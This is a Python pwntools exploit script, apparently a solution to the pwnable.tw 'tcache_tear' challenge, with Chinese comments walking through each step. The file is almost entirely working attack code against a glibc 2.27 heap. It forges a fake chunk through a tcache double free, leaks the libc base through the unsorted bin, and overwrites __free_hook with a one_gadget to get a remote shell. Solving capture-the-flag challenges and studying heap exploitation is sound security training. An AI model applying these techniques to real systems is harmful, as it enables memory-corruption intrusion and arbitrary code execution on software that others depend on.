#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'debug')

elf  = ELF('./tcache_tear')
libc = ELF('./libc.so.6')

name_buf = 0x602060
libc_binsh = list(libc.search(b'/bin/sh\x00'))[0]

class Challenge:
    def __init__(self, proc):
        self.proc = proc

    def malloc(self, size, data):
        self.proc.sendlineafter(b'choice :', b'1')
        self.proc.sendlineafter(b'Size:', str(size).encode('utf-8'))
        self.proc.sendlineafter(b'Data:', data)

    def free(self):
        self.proc.sendlineafter(b'choice :', b'2')

    def info(self):
        self.proc.sendlineafter(b'choice :', b'3')


def main():
    proc = remote('chall.pwnable.tw', 10207)
    #proc = elf.process()
    # proc = process(['./ld.so', './elf'], env={'LD_PRELOAD': './libc.so'})
    #log.debug('You may attatch this process to gdb now.')
    #input()

    # Develop your exploit here
    chall = Challenge(proc)

    # 輸入 Name 時, 於 name_buf 偽造一個 large chunk (size = 0x420).
    proc.sendlineafter(b'Name:', p64(0) + p64(0x421))

    # 接下來使用 tcache dup, 在剛才的 large chunk 之後額外偽造一塊 tcache chunk,
    # 並設置其 prev_inuse bit 為 1, 如此一來當 free() large chunk 時
    # 便能夠通過 double free or corruption (!prev) 的檢查.
    chall.malloc(0x40, b'')
    chall.free()
    chall.free()
    chall.malloc(0x40, p64(name_buf + 0x420))

    # 此時,
    # pwndbg> bins
    # tcachebins
    # 0x50 [  1]: 0x1d94260 —▸ 0x602480 ◂— ...

    # 將 0x1d94260 從 tcache[0x50] 中移除
    chall.malloc(0x40, b'')

    # 拿到 0x602480
    # 偽造 tcache chunk header 為 prev_size = 0, size = 0x20 (PREV_INUSE).
    payload  = p64(0)     # data / prev_size
    payload += p64(0x21)  # size
    payload += p64(0)     # next
    payload += p64(0)     # unused (no key in libc 2.27)
    payload += p64(0x0)   # data / prev_size
    payload += p64(0x21)  # size 
    chall.malloc(0x40, payload)

    # 接下來, 我們得想辦法 free `name_buf+0x10`,
    # 然後讓那塊 0x420 的 large chunk 被送進 unsorted bin,
    # 其 fd/bk 就會包含 unsorted bin 在 libc 中的 address.
    chall.malloc(0x30, b'')
    chall.free()
    chall.free()
    chall.malloc(0x30, p64(name_buf + 0x10))

    # 將 tcache[0x40] 的第一個 entry 移除
    chall.malloc(0x30, b'')

    # 拿到 name_buf + 0x10
    chall.malloc(0x30, b'')

    # 將 fake large chunk 做 free(), 使它進入 unsorted bin.
    chall.free()

    # Leak libc
    chall.info()
    proc.recvuntil(b'Name :')
    proc.recv(16)
    offset = 0x7f8be4952ca0 - 0x7f8be4567000
    libc_base = u64(proc.recv(6).ljust(8, b'\x00')) - offset
    log.info('leaked libc base: {}'.format(hex(libc_base)))

    # 拿 free_hook 寫 one_gadget.
    log.info('__free_hook@libc: {}'.format(hex(libc_base + libc.sym['__free_hook'])))
    chall.malloc(0x18, b'')
    chall.free()
    chall.free()
    chall.malloc(0x18, p64(libc_base + libc.sym['__free_hook']))
    chall.malloc(0x18, b'')
    chall.malloc(0x18, p64(libc_base + 0x4f322))
    chall.free()

    proc.interactive()


if __name__ == '__main__':
    main()
